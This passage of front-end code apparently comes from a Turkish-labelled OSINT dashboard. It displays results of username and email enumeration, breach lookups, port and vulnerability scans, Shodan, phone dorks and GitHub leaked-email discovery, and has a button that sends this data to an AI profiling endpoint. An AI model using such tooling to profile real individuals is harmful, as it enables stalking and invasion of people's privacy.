            <ResultRow label="Sızıntı (Breach)" value={breaches.length} color={breaches.length > 0 ? '#FF3D3D' : '#00E676'} />
            <ResultRow label="Pastebin Çıktısı" value={pastes.length} color={pastes.length > 0 ? '#FF9500' : '#00E676'} />
          </div>

          {/* AI PROFILER FOR EMAIL */}
          {found.length > 0 && (
            <div>
              <button 
                onClick={async () => {
                  setResults((prev: any) => ({ ...prev, aiLoading: true, aiProfile: null }));
                  try {
                    const res = await fetch('/api/ai/profile', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ target: r.email || query, type: 'E-Posta Adresi', data: { siteler: found.map((f: any) => f.site), sizintilar: breaches.map((b: any) => b.breach) } })
                    });
                    const data = await res.json();
                    setResults((prev: any) => ({ ...prev, aiProfile: data.profile || 'Profil oluşturulamadı.' }));
                  } catch (e) {
                    setResults((prev: any) => ({ ...prev, aiProfile: 'Hata oluştu.' }));
                  } finally {
                    setResults((prev: any) => ({ ...prev, aiLoading: false }));
                  }
                }}
                disabled={r.aiLoading}
                className="w-full bg-[#00E676]/10 hover:bg-[#00E676]/20 border border-[#00E676]/30 text-[#00E676] rounded py-1.5 flex items-center justify-center gap-2 text-[10px] font-mono font-bold transition-colors"
              >
                {r.aiLoading ? (
                  <>
                    <div className="w-3 h-3 border border-[#00E676] border-t-transparent rounded-full animate-spin"></div>
                    PROFIL ÇIKARILIYOR...
                  </>
                ) : (
                  <>
                    <ScanFace className="w-3.5 h-3.5" />
                    YAPAY ZEKA İLE PROFİL ÇIKAR
                  </>
                )}
              </button>
              
              {r.aiProfile && (
                <div className="mt-2 p-2 rounded bg-black/40 border border-[#00E676]/20 text-[10px] text-[#00E676] font-mono whitespace-pre-wrap leading-relaxed">
                  {r.aiProfile}
                </div>
              )}
            </div>
          )}

          {found.length > 0 && (
            <div>
              <SectionHeader title={`KAYITLI PLATFORMLAR (${found.length})`} icon={CheckCircle} color="#00E676" />
              <div className="space-y-0.5">
                {found.map((x: any, i: number) => (
                  <div key={i} className="flex items-center gap-2 py-1 px-2 rounded hover:bg-[var(--hover-accent)]">
                    <CheckCircle className="w-2.5 h-2.5 text-green-400 shrink-0" />
                    <span className="text-[11px] font-mono font-bold text-[var(--text-primary)] w-[140px] truncate">{x.site}</span>
                    <span className="text-[9px] font-mono text-[var(--text-muted)] flex-1 truncate">{x.domain}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {breaches.length > 0 && (
            <div>
              <SectionHeader title={`VERİ İHLALLERİ (${breaches.length})`} icon={ShieldAlert} color="#FF3D3D" />
              <div className="space-y-1">
                {breaches.map((b: any, i: number) => (
                  <div key={i} className="p-2 rounded bg-[#FF3D3D]/10 border border-[#FF3D3D]/30">
                    <div className="text-[11px] font-mono font-bold text-[#FF3D3D] mb-1">{b.breach}</div>
                    <div className="text-[9px] font-mono text-[var(--text-muted)]">{b.details || 'Veri ihlali tespit edildi.'}</div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {pastes.length > 0 && (
            <div>
              <SectionHeader title={`PASTEBIN SIZINTILARI (${pastes.length})`} icon={FileText} color="#FF9500" />
              <div className="flex flex-wrap gap-1 mt-1">
                {pastes.map((p: any, i: number) => (
                  <span key={i} className="text-[9px] font-mono bg-[#FF9500]/10 border border-[#FF9500]/30 text-[#FF9500] px-1.5 py-0.5 rounded">
                    {p}
                  </span>
                ))}
              </div>
            </div>
          )}

          {all.length > 0 && (
            <div>
              <SectionHeader title="TÜM KONTROLLER" icon={Search} color="#666" />
              <div className="flex flex-wrap gap-1">
                {all.map((x: any, i: number) => (
                  <span key={i}
                    className={`text-[8px] font-mono px-1.5 py-0.5 rounded border ${
                      x.status === 'exists' ? 'text-green-400 border-green-500/40 bg-green-500/10'
                      : x.status === 'rateLimit' ? 'text-orange-400 border-orange-500/30'
                      : 'text-[var(--text-muted)] border-white/10'}`}>
                    {x.site}{x.status === 'rateLimit' ? ' ⏱' : x.status === 'exists' ? ' ✓' : ''}
                  </span>
                ))}
              </div>
            </div>
          )}
        </div>
      );
    }

    // ── USERNAME ENUMERATION ──
    if (activeTab === 'username') {
      const found: any[] = Array.isArray(r.found) ? r.found : [];
      return (
        <div>
          <SectionHeader title="ARAMA ÖZETİ" icon={UserSearch} color="#00E676" />
          <ResultRow label="Kullanıcı Adı" value={r.username || query} color="#00E676" />
          <ResultRow label="Bulunan Hesap" value={found.length} color={found.length > 0 ? '#00E676' : '#FF9500'} />
          <ResultRow label="Kontrol Edilen Site" value={`${r.checked ?? 0} / ${r.total ?? 0}`} />
          {r.errors ? <ResultRow label="Ulaşılamayan" value={r.errors} color="#FF9500" /> : null}
          <ResultRow label="Geçen Süre" value={r.elapsedMs ? `${(r.elapsedMs / 1000).toFixed(1)}s` : '—'} />
          {r.truncated ? (
            <div className="mt-1.5 text-[9px] font-mono text-orange-400">
              ⚠ Hunt hit the time budget — results are partial.
            </div>
          ) : null}

          {found.length > 0 && (
            <div className="mt-4 mb-2">
              <button 
                onClick={async () => {
                  setResults((prev: any) => ({ ...prev, aiLoading: true, aiProfile: null }));
                  try {
                    const res = await fetch('/api/ai/profile', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ target: r.username || query, type: 'Kullanıcı Adı', data: found.map((f: any) => f.site) })
                    });
                    const data = await res.json();
                    setResults((prev: any) => ({ ...prev, aiProfile: data.profile || 'Profil oluşturulamadı.' }));
                  } catch (e) {
                    setResults((prev: any) => ({ ...prev, aiProfile: 'Hata oluştu.' }));
                  } finally {
                    setResults((prev: any) => ({ ...prev, aiLoading: false }));
                  }
                }}
                disabled={r.aiLoading}
                className="w-full bg-[#00E676]/10 hover:bg-[#00E676]/20 border border-[#00E676]/30 text-[#00E676] rounded py-1.5 flex items-center justify-center gap-2 text-[10px] font-mono font-bold transition-colors"
              >
                {r.aiLoading ? (
                  <>
                    <div className="w-3 h-3 border border-[#00E676] border-t-transparent rounded-full animate-spin"></div>
                    PROFIL ÇIKARILIYOR...
                  </>
                ) : (
                  <>
                    <ScanFace className="w-3.5 h-3.5" />
                    YAPAY ZEKA İLE PROFİL ÇIKAR
                  </>
                )}
              </button>
              
              {r.aiProfile && (
                <div className="mt-2 p-2 rounded bg-black/40 border border-[#00E676]/20 text-[10px] text-[#00E676] font-mono whitespace-pre-wrap leading-relaxed">
                  {r.aiProfile}
                </div>
              )}
            </div>
          )}

          {found.length > 0 ? (
            <>
              <SectionHeader title={`PROFİLLER (${found.length})`} icon={ExternalLink} color="#00E676" />
              <div className="space-y-0.5">
                {found.map((f: any, i: number) => (
                  <a
                    key={i}
                    href={f.url}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex items-center gap-2 py-1 px-2 rounded hover:bg-[var(--hover-accent)] transition-colors group"
                  >
                    <CheckCircle className="w-2.5 h-2.5 text-green-400 shrink-0" />
                    <span className="text-[11px] font-mono font-bold text-[var(--text-primary)] w-[120px] truncate">{f.site}</span>
                    {f.nsfw ? (
                      <span className="text-[8px] font-mono font-bold text-pink-400 border border-pink-500/40 rounded px-1">NSFW</span>
                    ) : null}
                    <span className="text-[9px] font-mono text-[var(--text-muted)] flex-1 truncate">{f.url}</span>
                    <ExternalLink className="w-2.5 h-2.5 text-[var(--text-muted)] group-hover:text-[var(--cyan-primary)] shrink-0" />
                  </a>
                ))}
              </div>
            </>
          ) : (
            <div className="mt-3 text-[10px] font-mono text-[var(--text-muted)]">
              No accounts found for this username.
            </div>
          )}
        </div>
      );
    }

    // ── PORT SCAN ──
    if (activeTab === 'scanner') {
      const ports = r.ports || r.open_ports || r.results || [];
      const host = r.host || r.target || query;
      return (
        <div>
          <SectionHeader title="HOST BİLGİSİ" icon={Server} color="#00E5FF" />
          <ResultRow label="Hedef" value={host} color="#00E5FF" />
          <ResultRow label="Tarama Tipi" value={r.scan_type || scanType} />
          <ResultRow label="Süre" value={r.duration || r.scan_time} />
          {Array.isArray(ports) && ports.length > 0 && (
            <>
              <SectionHeader title={`AÇIK PORTLAR (${ports.length})`} icon={Wifi} color="#00E676" />
              <div className="space-y-0.5">
                {ports.map((p: any, i: number) => (
                  <PortRow key={i} port={p.port || p} state={p.state || 'open'} service={p.service || p.name} version={p.version} />
                ))}
              </div>
            </>
          )}
          {(!Array.isArray(ports) || ports.length === 0) && renderFallback()}
        </div>
      );
    }

    // ── VULN SCAN ──
    if (activeTab === 'vuln') {
      const vulns = r.vulnerabilities || r.vulns || r.cves || [];
      const exploits = vulns.filter((v: any) => v.is_exploit);
      const regularVulns = vulns.filter((v: any) => !v.is_exploit);
      
      return (
        <div>
          <SectionHeader title="ZAFİYET DEĞERLENDİRMESİ" icon={Bug} color="#FF3D3D" />
          <ResultRow label="Hedef" value={r.target || query} color="#FF3D3D" />
          <ResultRow label="Toplam CVE" value={Array.isArray(vulns) ? vulns.length : 0} color={Array.isArray(vulns) && vulns.length > 0 ? '#FF3D3D' : '#00E676'} />
          <ResultRow label="Risk Düzeyi" value={r.risk_level || r.severity} />
          {Array.isArray(regularVulns) && regularVulns.length > 0 && (
            <div className="mt-2 space-y-1">
              {regularVulns.slice(0, 20).map((v: any, i: number) => (
                <div key={i} className="p-2 rounded-lg border border-red-500/20 bg-red-500/5 flex flex-col">
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] font-mono font-bold text-red-400">{v.id || v.cve || v.name}</span>
                    {v.severity && <span className={`text-[8px] font-mono font-bold px-1.5 py-0.5 rounded ${v.severity === 'CRITICAL' ? 'bg-red-500/20 text-red-400' : v.severity === 'HIGH' ? 'bg-orange-500/20 text-orange-400' : 'bg-yellow-500/20 text-yellow-400'}`}>{v.severity}</span>}
                  </div>
                  {v.cvss && <div className="text-[9px] font-mono text-[var(--text-muted)] mt-1">CVSS: {v.cvss} ({v.type || 'cve'})</div>}
                  {v.description && <p className="text-[9px] font-mono text-[var(--text-muted)] mt-1 line-clamp-2">{v.description}</p>}
                </div>
              ))}
            </div>
          )}
          
          {exploits.length > 0 && (
            <div className="mt-4">
              <SectionHeader title={`POSSIBLE EXPLOITS (${exploits.length})`} icon={AlertTriangle} color="#FF9500" />
              <div className="mt-2 space-y-1">
                {exploits.slice(0, 10).map((e: any, i: number) => (
                  <div key={i} className="p-2 rounded-lg border border-orange-500/30 bg-orange-500/10 flex flex-col">
                    <div className="flex items-center justify-between">
                      <span className="text-[10px] font-mono font-bold text-orange-400">{e.id}</span>
                      <span className="text-[8px] font-mono font-bold px-1.5 py-0.5 rounded bg-orange-500/20 text-orange-400">EXPLOIT</span>
                    </div>
                    <div className="text-[9px] font-mono text-[var(--text-muted)] mt-1 flex justify-between">
                      <span>Source: {e.type?.toUpperCase() || 'UNKNOWN'}</span>
                      {e.cvss && <span>CVSS: {e.cvss}</span>}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
          
          {(!Array.isArray(vulns) || vulns.length === 0) && renderFallback()}
        </div>
      );
    }



    // ── DNS ──
    if (activeTab === 'dns') {
      return (
        <div>
          <SectionHeader title="DNS KAYITLARI" icon={Server} color="#448AFF" />
          <ResultRow label="Alan Adı" value={r.domain || query} color="#448AFF" />
          {r.A && <ResultRow label="A Kayıtları" value={Array.isArray(r.A) ? r.A.join(', ') : r.A} />}
          {r.AAAA && <ResultRow label="AAAA" value={Array.isArray(r.AAAA) ? r.AAAA.join(', ') : r.AAAA} />}
          {r.MX && <ResultRow label="MX" value={Array.isArray(r.MX) ? r.MX.map((m:any) => m.exchange || m).join(', ') : r.MX} />}
          {r.NS && <ResultRow label="NS" value={Array.isArray(r.NS) ? r.NS.join(', ') : r.NS} />}
          {r.TXT && <ResultRow label="TXT" value={Array.isArray(r.TXT) ? r.TXT.join(' | ') : r.TXT} />}
          {r.CNAME && <ResultRow label="CNAME" value={Array.isArray(r.CNAME) ? r.CNAME.join(', ') : r.CNAME} />}
          {r.SOA && <ResultRow label="SOA" value={typeof r.SOA === 'object' ? `${r.SOA.nsname} (${r.SOA.hostmaster})` : r.SOA} />}
          {renderFallbackExcluding(['domain','A','AAAA','MX','NS','TXT','CNAME','SOA','timestamp','cached'])}
        </div>
      );
    }

    // ── WHOIS ──
    if (activeTab === 'whois') {
      return (
        <div>
          <SectionHeader title="WHOIS İSTİHBARATI" icon={FileText} color="#FFD700" />
          <SanctionsBadge match={r.sanctions_match} />
          <ResultRow label="Alan Adı" value={r.domain_name || r.domainName || query} color="#FFD700" />
          <ResultRow label="Kayıt Kuruluşu" value={r.registrar} />
          <ResultRow label="Oluşturma" value={r.creation_date || r.createdDate} />
          <ResultRow label="Bitiş" value={r.expiration_date || r.expiresDate} />
          <ResultRow label="Güncellendi" value={r.updated_date || r.updatedDate} />
          <ResultRow label="Durum" value={Array.isArray(r.status) ? r.status.join(', ') : r.status} />
          <ResultRow label="Ad Sunucuları" value={Array.isArray(r.name_servers || r.nameServers) ? (r.name_servers || r.nameServers).join(', ') : r.name_servers} />
          {renderFallbackExcluding(['domain_name','domainName','registrar','creation_date','createdDate','expiration_date','expiresDate','updated_date','updatedDate','status','name_servers','nameServers','timestamp','cached','raw','sanctions_match'])}
        </div>
      );
    }

    // ── SHODAN ──
    if (activeTab === 'shodan') {
      return (
        <div>
          <SectionHeader title="SHODAN IOT" icon={Network} color="#FF3D3D" />
          <ResultRow label="Hedef IP" value={r.ip || query} color="#FF3D3D" />
          {r.hostnames?.length > 0 && <ResultRow label="Host Adları" value={r.hostnames.join(', ')} />}
          {r.ports?.length > 0 && <ResultRow label="Açık Portlar" value={r.ports.join(', ')} color="#00E5FF" />}
          {r.tags?.length > 0 && <ResultRow label="Etiketler" value={r.tags.join(', ')} color="#FF9500" />}
          {r.vulns?.length > 0 && (
            <div className="mt-2 p-2 border border-red-500/30 bg-red-500/10 rounded">
              <span className="text-[10px] font-mono text-red-400 font-bold mb-1 block">VULNERABILITIES ({r.vulns.length})</span>
              <div className="flex flex-wrap gap-1">
                {r.vulns.slice(0, 10).map((v: string) => (
                  <a key={v} href={`https://nvd.nist.gov/vuln/detail/${v}`} target="_blank" rel="noreferrer" className="text-[9px] font-mono px-1.5 py-0.5 rounded bg-[#1A1A18] text-[#8A8880] hover:text-[#FF3D3D]">{v}</a>
                ))}
                {r.vulns.length > 10 && <span className="text-[9px] font-mono text-[#8A8880]">+{r.vulns.length - 10} more</span>}
              </div>
            </div>
          )}
          {renderFallbackExcluding(['ip','hostnames','ports','tags','vulns','cpes'])}
        </div>
      );
    }

    // ── BGP ──
    if (activeTab === 'bgp') {
      return (
        <div>
          <SectionHeader title="BGP YÖNLENDİRME" icon={Globe} color="#00E5FF" />
          <ResultRow label="Sorgu" value={r.query} color="#00E5FF" />
          {r.type === 'ip' && r.ip && (
            <>
              {r.ip.prefixes?.map((p: any, i: number) => (
                <div key={i} className="mt-2 p-2 border border-[#00E5FF]/20 bg-[#00E5FF]/5 rounded">
                  <ResultRow label="ASN" value={`AS${p.asn.asn} - ${p.asn.name}`} color="#00E5FF" />
                  <ResultRow label="Önek" value={p.prefix} />
                  <ResultRow label="Ülke" value={p.asn.country_code} />
                  <ResultRow label="Açıklama" value={p.asn.description} />
                </div>
              ))}
            </>
          )}
          {r.type === 'asn' && r.asn && (
            <div className="mt-2 p-2 border border-[#00E5FF]/20 bg-[#00E5FF]/5 rounded">
              <ResultRow label="ASN" value={`AS${r.asn.asn}`} color="#00E5FF" />
              <ResultRow label="Ad" value={r.asn.name} />
              <ResultRow label="Açıklama" value={r.asn.description} />
              <ResultRow label="Ülke" value={r.asn.country_code} />
              {r.prefixes && <ResultRow label="Önekler" value={`IPv4: ${r.prefixes.total_v4} | IPv6: ${r.prefixes.total_v6}`} />}
              {r.peers && <ResultRow label="Eşler" value={r.peers.total} />}
            </div>
          )}
          {renderFallbackExcluding(['query', 'type', 'ip', 'asn', 'prefixes', 'peers', 'timestamp'])}
        </div>
      );
    }

    // ── MAC ──
    if (activeTab === 'mac') {
      return (
        <div>
          <SectionHeader title="MAC ÜRETİCİ" icon={Fingerprint} color="#FFD700" />
          <ResultRow label="MAC Adresi" value={r.mac} color="#FFD700" />
          <ResultRow label="Üretici" value={r.vendor} color={r.vendor === 'Not Found' ? '#FF3D3D' : '#00E676'} />
        </div>
      );
    }

    // ── PHONE ──
    if (activeTab === 'phone') {
      return (
        <div>
          <SectionHeader title="TELEFON İSTİHBARATI" icon={Phone} color="#FF9500" />
          <ResultRow label="Sorgu" value={r.query} color="#FF9500" />
          <ResultRow label="Geçerli" value={r.valid ? 'YES' : 'NO'} color={r.valid ? '#00E676' : '#FF3D3D'} />
          {r.valid && (
            <>
              <ResultRow label="E.164 Biçim" value={r.number} />
              <ResultRow label="Uluslararası Biçim" value={r.international} />
              <ResultRow label="Ulusal Biçim" value={r.national} />
              <ResultRow label="Ülke" value={`${r.region} (${r.country_code})`} />
              <ResultRow label="Hat Tipi" value={r.line_type} color={r.line_type === 'MOBILE' ? '#00E5FF' : r.line_type === 'VOIP' ? '#FF9500' : undefined} />
            </>
          )}
          {r.footprint && (() => {
            const fp = r.footprint;
            const groups: [string, any[], string][] = [
              ['GENERAL', fp.general || [], '#FFD700'],
              ['SOCIAL MEDIA', fp.social || [], '#448AFF'],
              ['REPUTATION / SCAM', fp.reputation || [], '#FF3D3D'],
              ['DISPOSABLE SMS', fp.disposable || [], '#9C27B0'],
            ];
            return groups.map(([title, dorks, color]) => dorks.length > 0 && (
              <div key={title}>
                <SectionHeader title={`${title} (${dorks.length})`} icon={Search} color={color} />
                <div className="flex flex-wrap gap-1">
                  {dorks.map((d: any, i: number) => (
                    <a key={i} href={d.url} target="_blank" rel="noopener noreferrer"
                      title={d.query}
                      className="text-[9px] font-mono px-1.5 py-0.5 rounded border border-white/10 text-[var(--text-secondary)] hover:text-[var(--cyan-primary)] hover:border-cyan-500/40 transition-colors">
                      {d.label} ↗
                    </a>
                  ))}
                </div>
              </div>
            ));
          })()}
        </div>
      );
    }

    // ── GITHUB ──
    if (activeTab === 'github') {
      return (
        <div>
          <SectionHeader title="GITHUB KEŞİF" icon={Terminal} color="#87CEEB" />
          <div className="flex items-center gap-3 mb-2">
            {r.avatar_url && <img src={r.avatar_url} alt="avatar" className="w-10 h-10 rounded-full border border-[#87CEEB]/30" />}
            <div>
              <div className="text-[12px] font-mono font-bold text-[#87CEEB]">{r.name || r.username}</div>
              <div className="text-[9px] font-mono text-[var(--text-muted)]">@{r.username} • {r.followers} followers</div>
            </div>
          </div>
          <ResultRow label="Şirket" value={r.company} />
          <ResultRow label="Konum" value={r.location} />
          <ResultRow label="Email (profil)" value={r.email} color="#00E676" />
          <ResultRow label="Twitter" value={r.twitter} color="#448AFF" />
          <ResultRow label="Web Sitesi" value={r.blog} />
          <ResultRow label="Repo / SSH anahtarı" value={`${r.public_repos ?? 0} / ${r.ssh_keys ?? 0}`} />
          <ResultRow label="Biyografi" value={r.bio} />

          {Array.isArray(r.leaked_emails) && r.leaked_emails.length > 0 && (
            <div className="mt-2 p-2 border border-[#00E676]/40 bg-[#00E676]/10 rounded">
              <span className="text-[10px] font-mono text-[#00E676] font-bold mb-1 block">⚠ LEAKED COMMIT EMAILS ({r.leaked_emails.length})</span>
              {r.leaked_emails.map((e: any, i: number) => (
                <div key={i} className="text-[9px] font-mono text-[#E8E6E0] break-all mb-0.5">
                  {e.email}{e.names?.length ? <span className="text-[var(--text-muted)]"> — {e.names.join(', ')}</span> : null}
                </div>
              ))}
            </div>
          )}

          {Array.isArray(r.orgs) && r.orgs.length > 0 && (
            <><SectionHeader title={`ORGANİZASYONLAR (${r.orgs.length})`} icon={Globe} color="#87CEEB" />
            <div className="flex flex-wrap gap-1">{r.orgs.map((o: string) => (
              <span key={o} className="text-[9px] font-mono px-1.5 py-0.5 rounded border border-[#87CEEB]/30 text-[#87CEEB]">{o}</span>
            ))}</div></>
          )}

          {Array.isArray(r.gists) && r.gists.length > 0 && (
            <><SectionHeader title={`GIST'LER (${r.gists.length})`} icon={FileText} color="#FFD700" />
            <div className="space-y-0.5">{r.gists.map((g: any, i: number) => (
              <a key={i} href={g.url} target="_blank" rel="noopener noreferrer" className="block text-[9px] font-mono text-[var(--text-secondary)] hover:text-[var(--cyan-primary)] truncate">{g.files} — {g.description}</a>
            ))}</div></>
          )}

          {r.recent_repos?.length > 0 && (
            <div className="mt-2 p-2 border border-[#87CEEB]/20 bg-[#87CEEB]/5 rounded">
              <span className="text-[9px] font-mono text-[#87CEEB] block mb-1">RECENT REPOS</span>
              {r.recent_repos.map((repo: any, i: number) => (
                <div key={i} className="flex justify-between text-[9px] font-mono mb-0.5">
                  <span className="text-[#E8E6E0]">{repo.name}</span>
                  <span className="text-[var(--text-muted)]">{repo.language || 'Unknown'}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      );
    }

    // ── LEAKS ──
    if (activeTab === 'leaks') {
      return (
        <div>
          <SectionHeader title="VERİ SIZINTISI TARAMASI" icon={ShieldAlert} color="#E040FB" />
          <ResultRow label="Hedef Email" value={r.email} color="#E040FB" />
          <ResultRow label="Durum" value={r.breached ? 'COMPROMISED' : 'SECURE'} color={r.breached ? '#FF1744' : '#00E676'} />
          
          {r.breached && r.data_exposed?.length > 0 && (
            <div className="mt-2 p-2 border border-[#E040FB]/30 bg-[#E040FB]/10 rounded">
              <span className="text-[10px] font-mono text-[#E040FB] font-bold mb-1 block">EXPOSED DATA POINTS</span>
              <div className="flex flex-wrap gap-1">
                {r.data_exposed.map((dc: string) => (
                  <span key={dc} className="text-[9px] font-mono px-1.5 py-0.5 rounded bg-[#1A1A18] text-[#E8E6E0] border border-[#E040FB]/20">{dc}</span>
                ))}
              </div>
            </div>
          )}

          {r.breached && r.breaches?.length > 0 && (
            <div className="mt-2 p-2 border border-red-500/30 bg-red-500/10 rounded">
              <span className="text-[10px] font-mono text-red-400 font-bold mb-1 block">KNOWN BREACHES ({r.breaches.length})</span>
              <div className="flex flex-col gap-1">
                {r.breaches.map((b: string) => (
                  <a key={b} href={`https://haveibeenpwned.com/PwnedWebsites#${b}`} target="_blank" rel="noreferrer" className="text-[9px] font-mono px-2 py-1 rounded bg-[#1A1A18] text-red-300 hover:text-white hover:bg-red-500/30 flex items-center justify-between transition-colors">
                    <span>{b}</span>
                    <ExternalLink className="w-2.5 h-2.5" />
                  </a>
                ))}
              </div>
            </div>
          )}
        </div>
      );
    }

    // ── CERTS ──
    if (activeTab === 'certs') {
      const certs = r.certificates || r.certs || (Array.isArray(r) ? r : []);
      return (
        <div>
          <SectionHeader title="SERTİFİKA ŞEFFAFLIĞI" icon={Lock} color="#E040FB" />
          <ResultRow label="Alan Adı" value={query} color="#E040FB" />
          <ResultRow label="Sertifikalar" value={Array.isArray(certs) ? certs.length : 0} />
          {Array.isArray(certs) && certs.slice(0, 15).map((c: any, i: number) => (
            <div key={i} className="mt-1.5 p-2 rounded border border-[var(--border-secondary)]/30 bg-[var(--bg-tertiary)]/30">
              <ResultRow label="Veren" value={c.issuer_name || c.issuer} />
              <ResultRow label="Ortak Ad" value={c.common_name || c.name_value} />
              <ResultRow label="Geçerlilik Başı" value={c.not_before} />
              <ResultRow label="Geçerlilik Sonu" value={c.not_after} />
            </div>
          ))}
          {(!Array.isArray(certs) || certs.length === 0) && renderFallback()}
        </div>
      );
    }

    // ── THREATS ──
    if (activeTab === 'threats') {
      return (
        <div>
          <SectionHeader title="TEHDİT İSTİHBARATI" icon={AlertTriangle} color="#FF9500" />
          <ResultRow label="Sorgu" value={query} color="#FF9500" />
          <ResultRow label="Risk Puanı" value={r.risk_score || r.score} color={
            (r.risk_score || r.score || 0) > 70 ? '#FF3D3D' : (r.risk_score || r.score || 0) > 40 ? '#FF9500' : '#00E676'
          } />
          <ResultRow label="Zararlı" value={r.malicious !== undefined ? (r.malicious ? 'YES' : 'NO') : undefined} color={r.malicious ? '#FF3D3D' : '#00E676'} />
          <ResultRow label="Kategori" value={r.category || r.type} />
          <ResultRow label="Raporlar" value={r.total_reports || r.reports} />
          <ResultRow label="Son Görülme" value={r.last_seen || r.last_analysis} />
          {r.tags && <ResultRow label="Etiketler" value={Array.isArray(r.tags) ? r.tags.join(', ') : r.tags} />}
          {renderFallbackExcluding(['risk_score','score','malicious','category','type','total_reports','reports','last_seen','last_analysis','tags','timestamp','cached','query'])}
        </div>
      );
    }

    // ── SSL ──
    if (activeTab === 'ssl') {
      return (
        <div>
          <SectionHeader title="SSL/TLS ANALİZİ" icon={Shield} color="#76FF03" />
          <ResultRow label="Hedef" value={query} color="#76FF03" />
          <ResultRow label="Protokol" value={r.protocol || r.tls_version} />
          <ResultRow label="Şifreleme" value={r.cipher || r.cipher_suite} />
          <ResultRow label="Geçerli" value={r.valid !== undefined ? (r.valid ? 'YES' : 'NO') : undefined} color={r.valid ? '#00E676' : '#FF3D3D'} />
          <ResultRow label="Veren" value={r.issuer} />
          <ResultRow label="Konu" value={r.subject} />
          <ResultRow label="Bitiş" value={r.expires || r.not_after} />
          <ResultRow label="SANs" value={Array.isArray(r.sans) ? r.sans.join(', ') : r.sans} />
          {renderFallback()}
        </div>
      );
    }



    // Fallback for other tools
    return renderFallback();
  };

  const renderFallback = () => {
    if (!results) return null;
    return (
      <div className="space-y-1">
        {Object.entries(results).filter(([k]) => !['timestamp','cached'].includes(k)).map(([key, value]) => (
          <ResultRow key={key} label={key.replace(/_/g, ' ')} value={typeof value === 'object' ? JSON.stringify(value, null, 1) : String(value)} />
        ))}
      </div>
    );
  };

  const renderFallbackExcluding = (exclude: string[]) => {
    if (!results) return null;
    const extra = Object.entries(results).filter(([k]) => !exclude.includes(k));
    if (extra.length === 0) return null;
    return (
      <div className="mt-2 space-y-1">
        {extra.map(([key, value]) => (
          <ResultRow key={key} label={key.replace(/_/g, ' ')} value={typeof value === 'object' ? JSON.stringify(value, null, 1) : String(value)} />
        ))}
      </div>
    );
  };

  const renderContent = () => (
    <div className="flex flex-col gap-2.5">
      {/* AiSOC Dashboard Header */}
      <div className="flex items-center justify-between bg-black/60 border border-red-500/50 rounded-lg p-3 relative overflow-hidden shadow-[0_0_15px_rgba(255,0,0,0.15)]">
        <div className="absolute inset-0 bg-gradient-to-r from-red-500/10 via-transparent to-blue-500/10 pointer-events-none" />
        <div className="flex items-center gap-3 relative z-10">
          <ShieldAlert className="w-6 h-6 text-red-500 animate-pulse" />
          <div>
            <div className="text-[14px] font-bold text-red-500 font-mono tracking-widest">AiSOC OPERATIONS CENTER</div>
            <div className="text-[9px] text-white/70 font-mono">PURPLE-TEAM ACTIVE · MITRE ATT&CK READY</div>
          </div>
        </div>
        <div className="flex items-center gap-4 relative z-10 hidden sm:flex">
          <div className="flex flex-col items-end">
            <span className="text-[8px] text-red-400 font-mono">THREAT LEVEL</span>
            <span className="text-[12px] font-bold text-red-500 font-mono">ELEVATED</span>
          </div>
          <div className="w-px h-6 bg-white/20" />
          <div className="flex flex-col items-end">
            <span className="text-[8px] text-[#00E5FF] font-mono">AGENT STATUS</span>
            <span className="text-[12px] font-bold text-[#00E5FF] font-mono">ONLINE</span>
          </div>
        </div>
      </div>

      {/* Tool Grid */}
      <div className="flex flex-col gap-1">
        {/* Sweep - Main Action */}
        {TABS.filter(t => t.id === 'sweep').map(tab => (
          <button key={tab.id} onClick={() => { setActiveTab(tab.id); setQuery(''); setResults(null); setError(''); }}
            className={`flex items-center justify-center gap-2 px-3 py-3 rounded-lg text-[12px] font-mono tracking-widest font-bold transition-all border ${activeTab === tab.id ? 'border-opacity-60 bg-opacity-20' : 'border-[var(--border-secondary)] hover:bg-[var(--hover-accent)]'}`}
            style={{ 
              borderColor: activeTab === tab.id ? tab.color : 'rgba(255,61,61,0.3)', 
              backgroundColor: activeTab === tab.id ? `${tab.color}20` : 'rgba(255,61,61,0.05)', 
              color: activeTab === tab.id ? tab.color : tab.color,
              boxShadow: activeTab === tab.id ? `0 0 15px ${tab.color}30` : 'none'
            }}>
            <tab.icon className="w-5 h-5" />
            <span>GLOBAL {tab.label}</span>
          </button>
        ))}
        {/* Other Tools */}
        <div className="grid grid-cols-5 gap-1 mt-1">
          {TABS.filter(t => t.id !== 'sweep').map(tab => (
            <button key={tab.id} onClick={() => { setActiveTab(tab.id); setQuery(''); setResults(null); setError(''); }}
              className={`flex flex-col items-center gap-1 px-1 py-2 rounded-lg text-[8px] font-mono tracking-wider transition-all border ${activeTab === tab.id ? 'border-opacity-40 bg-opacity-15' : 'border-transparent hover:bg-[var(--hover-accent)]'}`}
              style={{ borderColor: activeTab === tab.id ? tab.color : 'transparent', backgroundColor: activeTab === tab.id ? `${tab.color}15` : undefined, color: activeTab === tab.id ? tab.color : 'var(--text-muted)' }}>
              <tab.icon className="w-3.5 h-3.5" />
              <span className="leading-tight text-center w-full" style={{ display: '-webkit-box', WebkitLineClamp: 2, WebkitBoxOrient: 'vertical', overflow: 'hidden', wordBreak: 'normal' }}>{tab.label}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Input Area */}
      <div className="flex flex-col gap-1.5">
        <div className="flex gap-1.5">
          <div className="flex-1 relative">
            <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-[var(--text-muted)]" />
            <input type="text" value={query} onChange={e => setQuery(e.target.value)} onKeyDown={e => e.key === 'Enter' && runLookup()}
              placeholder={currentTab?.placeholder}
              className="w-full bg-[var(--bg-primary)]/60 border border-[var(--border-primary)] rounded-lg pl-8 pr-3 py-2.5 text-[11px] font-mono text-[var(--text-primary)] placeholder:text-[var(--text-muted)]/40 focus:outline-none transition-colors"
              style={{ borderColor: query ? `${currentTab?.color}40` : undefined }} />
          </div>
          <button onClick={runLookup} disabled={loading || !query.trim()}
            className="px-4 py-2 rounded-lg text-[10px] font-mono font-bold tracking-wider disabled:opacity-30 transition-all flex items-center justify-center min-w-[70px]"
